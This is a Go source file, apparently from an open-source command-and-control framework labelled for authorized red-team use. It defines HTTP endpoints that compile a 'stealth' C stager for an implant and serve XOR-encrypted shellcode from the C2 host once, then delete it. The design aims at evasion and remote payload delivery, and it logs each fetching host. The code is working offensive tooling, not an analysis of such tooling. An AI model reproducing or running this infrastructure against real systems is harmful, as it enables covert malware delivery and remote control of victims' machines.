package web

/*
	SUDOSOC-C2 — Stealth C Stager endpoints
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing and red team operations only.

	POST /api/generate/stealth
	  body: { binary_path, implant_name, is_shellcode, c2_host, c2_port, use_tls }
	  resp: { path, stage_url, message }

	GET  /api/stage/{id}
	  Returns the XOR-encrypted shellcode for the given stage ID (one-shot).
*/

import (
	"encoding/json"
	"fmt"
	"net/http"
	"path/filepath"
	"strings"

	"github.com/gorilla/mux"
	"github.com/sudosoc/SUDOSOC-C2/server/generate"
)

// ── POST /api/generate/stealth ────────────────────────────────────────────────

type stealthReq struct {
	BinaryPath  string `json:"binary_path"`
	ImplantName string `json:"implant_name"`
	IsShellcode bool   `json:"is_shellcode"`
	C2Host      string `json:"c2_host"`
	C2Port      int    `json:"c2_port"`
	UseTLS      bool   `json:"use_tls"`
}

type stealthResp struct {
	Path     string `json:"path"`
	StageURL string `json:"stage_url"`
	Message  string `json:"message"`
}

func handleGenerateStealth(w http.ResponseWriter, r *http.Request) {
	var req stealthReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.BinaryPath == "" {
		jsonError(w, "binary_path is required", http.StatusBadRequest)
		return
	}
	if req.C2Host == "" {
		jsonError(w, "c2_host is required", http.StatusBadRequest)
		return
	}
	if req.C2Port == 0 {
		req.C2Port = 8080
	}

	// Security: only files in slivers dir or /tmp
	abs := filepath.Clean(req.BinaryPath)
	sliversDir := generate.GetSliversDir()
	if !strings.HasPrefix(abs, sliversDir) && !strings.HasPrefix(abs, "/tmp") {
		jsonError(w, "path not in allowed directories", http.StatusForbidden)
		return
	}

	name := req.ImplantName
	if name == "" {
		name = "implant"
	}

	stageID := generate.GenerateStageID()

	packed, err := generate.BuildCStager(
		abs, name, stageID,
		req.C2Host, req.C2Port, req.UseTLS, req.IsShellcode,
	)
	if err != nil {
		jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}

	scheme := "http"
	if req.UseTLS {
		scheme = "https"
	}
	stageURL := fmt.Sprintf("%s://%s:%d/api/stage/%s", scheme, req.C2Host, req.C2Port, stageID)

	_ = json.NewEncoder(w).Encode(stealthResp{
		Path:     packed,
		StageURL: stageURL,
		Message: fmt.Sprintf(
			"C stager compiled (~50KB, no Go runtime, no embedded payload). "+
				"Stage URL active: %s — served once then deleted.", stageURL),
	})
}

// ── GET /api/stage/{id} ───────────────────────────────────────────────────────

func handleStageDownload(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]
	if id == "" {
		http.NotFound(w, r)
		return
	}

	entry, ok := generate.ConsumeStage(id)
	if !ok {
		http.NotFound(w, r)
		return
	}

	// Visible log in the server console so the operator knows the stage was fetched
	fmt.Printf("\n[stage] 🔔 Stage %s downloaded by %s (%d KB)\n\n",
		id[:8], r.RemoteAddr, len(entry.EncryptedData)/1024)

	// Return raw encrypted bytes
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(entry.EncryptedData)))
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(entry.EncryptedData)
}
